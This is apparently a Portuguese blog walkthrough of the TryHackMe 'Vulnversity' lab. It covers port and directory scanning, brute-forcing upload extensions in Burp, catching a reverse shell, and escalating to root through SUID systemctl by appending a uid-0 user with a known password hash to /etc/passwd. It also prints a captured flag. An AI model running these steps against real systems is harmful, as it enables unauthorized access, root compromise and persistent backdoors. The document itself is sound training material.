---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Vulnversity - Fácil
date: 2024-01-22 01:29:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, suid, burp, facil, suid3num]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/vulnversity.png){: w="100" h="100" .left}

---

# **CTF - Vulnversity**
---
---
## **Enumeração**


### nmap 

```shell
└─$ sudo nmap -sV -sS -Pn --min-rate 10000 --stats-every=7s 10.10.64.102 -oA nmap                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 05:01 -03
Nmap scan report for 10.10.64.102
Host is up (0.21s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds

```
{: .nolineno }

### ffuf

 ```shell
 :: Method           : GET
 :: URL              : http://10.10.64.102:3333/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .txt .old .bkp 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess.bkp           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 594ms]
.htpasswd.php           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 320ms]
.htpasswd.txt           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 321ms]
.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 322ms]
.htpasswd.bkp           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 323ms]
.htpasswd.old           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 322ms]
.htaccess.old           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 323ms]
.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 317ms]
.htaccess.txt           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 303ms]
.htaccess.php           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 320ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 249ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 236ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 207ms]
internal                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 217ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 216ms]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 238ms]
:: Progress: [102345/102345] :: Job [1/1] :: 143 req/sec :: Duration: [0:03:16] :: Errors: 86 ::
 ```
{: .nolineno }

index of  
- `http://10.10.64.102:3333/css/`  
- `http://10.10.64.102:3333/fonts/`  
- `http://10.10.64.102:3333/images/`  
  
página de upload
- `http://10.10.64.102:3333/internal/`


 Apache httpd 2.4.18 ((Ubuntu)) tem exploit de escalação de privilégio.
 CVE-2019-0211
 
 Tentei alguns formatos de arquivos na pagina de upload (php, php5, php7, txt jpg) sem sucesso.


 Bursuite na página de upload
 
 Vamos interceptar o request, pode enviar qualquer arquivo txt
 
 ![Alt text](/assets/img/vulnversity1.png)

Agora enviei para intruder (Actions/Send to intruder)  
Selecione Attack Type Sniper.  
Selecione a extensão da request no caso .txt e clique no botão add.

![Alt text](/assets/img/vulnversity2.png)
Em payload cliquei em load e usei essa wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt  
Caso não tiver, tenha !.  
`sudo apt install seclists`

![Alt text](/assets/img/vulnversity3.png)
Desmarquei a caixa URL encode, caso contrario não vai funcionar (motivo de ficar perdendo tempo e não saber porque não funcionava)
![Alt text](/assets/img/vulnversity4.png)

Ultima configuração não necessária, mas pra aprendizado é bem válida.
Em settings/Grep - Extract
Clique ADD vai abrir essa janela com o response selecione onde da a mensagem de erro e clique OK.
Esta configuração vai te mostrar quais opções deram sucesso.
![Alt text](/assets/img/vulnversity5.png)
E aqui esta o resultado, Sucess por causa da configuração anterior, caso nao fizesse essa opção deveria procurar pelo Lenght diferente e confirmar no response qual deu certo.
![Alt text](/assets/img/vulnversity6.png)

## **Acesso**
### Reverse Shell
Fiz upload do arquivo shell.phtml
Rodei o ffuf novamente pra ver onde foi parar o arquivo.  
``$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.152.108:3333/internal/FUZZ -t 200 -v -e .php,.txt,.old,.bkp``
![Alt text](/assets/img/vulnversity7.png)
 
 Executada em `http://10.10.152.108:3333/internal/uploads/shell.phtml`
 
```shell
 ┌──(kali💀kali)-[~/thm/vulnversity]
└─$ rlwrap nc -lvnp 4443       
listening on [any] 4443 ...
connect to [10.6.125.125] from (UNKNOWN) [10.10.152.108] 46796
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:44:07 up 22 min,  0 users,  load average: 0.00, 0.01, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1334): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vulnuniversity:/$ 
```
{: .nolineno }


### Primeira flag  
Encontrada em /home/bill

```shell
ww-data@vulnuniversity:/home/bill$ ls -la
ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
www-data@vulnuniversity:/home/bill$ cat user
cat user
cat: user: No such file or directory
www-data@vulnuniversity:/home/bill$ cat user	
cat user.txt 
8bd7992fbe8a6ad22a63361004cfcedb
www-data@vulnuniversity:/home/bill$ 
```
{: .nolineno }

## **Escalação de Privilégio**

Não tenho sudo -l, vou pesquisar por binários SUID

### Buscando por Binários SUID
Pode usar `find / -perm -4000 2>dev/null`

ou executar o suid3num.py, preferi esse, por ser mais rápido e já nos mostrar quais SUID podem ser abusados.
![Alt text](/assets/img/vulnversity8.png)

Com esse exploit de SUID você não vai ganhar uma shell root.
> Ele vai executar esse comando como root >>> `ExecStart=/bin/sh -c "id > /tmp/output"`
{: .prompt-danger }
Pode usar ExecStart=/bin/sh -c "cat /root/root.txt"  e você ja pega sua flag.
Porém pra teste/estudo e imaginando que fosse um ambiente real de pentest, eu gostaria de ter um usuário root de fácil acesso, sem executar esse exploit sempre que acessar novamente a maquina.
Então resolvi adicionar um usuário root no /etc/passwd
### Criando usuário e senha no /etc/passwd

```shell
┌──(kali💀kali)-[~/SUID3NUM]
└─$ mkpasswd -m MD5 senha123
$1$nadkIwzJ$SmxU5RXAwnbBEJaxT/NWY/
```
{: .nolineno } 
Copie o usuário root do /etc/passwd, fica mais fácil de criar a linha   
`root:x:0:0:root:/root:/bin/bash`  
Adicione a hash no x e edite o nome root.
Ficando assim  
`pentest:\$1\$nadkIwzJ\$SmxU5RXAwnbBEJaxT/NWY/:0:0:root:/root:/bin/bash`
  

Criei um shell script porque o comando tava bugando quando colava no terminal.

Criei o script na pasta /tmp e dei permissão de execução   `chmod +x xd.sh`

```bash
#!/bin/bash
command="echo 'pentest:\$1\$nadkIwzJ\$SmxU5RXAwnbBEJaxT/NWY/:0:0:root:/root:/bin/bash' >> /etc/passwd"
/bin/sh -c "$command"
```
{: .nolineno }   


Executei linha por linha no terminal

`TF=$(mktemp).service`  
`Type=oneshot`  
`Type=oneshot`  
`ExecStart=/bin/sh -c "./tmp/xd.sh"`  
`[Install]`  
`WantedBy=multi-user.target' > $TF`  
`/bin/systemctl link $TF`  
`/bin/systemctl enable --now $TF`  

```shell
www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "./tmp/xd.sh"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.cnziQke30D.service to /tmp/tmp.cnziQke30D.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.cnziQke30D.service to /tmp/tmp.cnziQke30D.service.

www-data@vulnuniversity:/tmp$ cat /etc/passwd |grep pentest
pentest:$1$nadkIwzJ$SmxU5RXAwnbBEJaxT/NWY/:0:0:root:/root:/bin/bash
www-data@vulnuniversity:/tmp$ su pentest
Password: 
root@vulnuniversity:/tmp# 
```

## Segunda flag
![Alt text](/assets/img/vulnversity9.png)

Agora tenho root e posso criar ssh e sempre ter acesso a maquina sem fazer todo o exploit.

**Conhecimentos adquiridos:**
- Escalação de privilégio com SUID systemctl 
- No Burp/Payload encoding desmarcar a opção de URL encode XD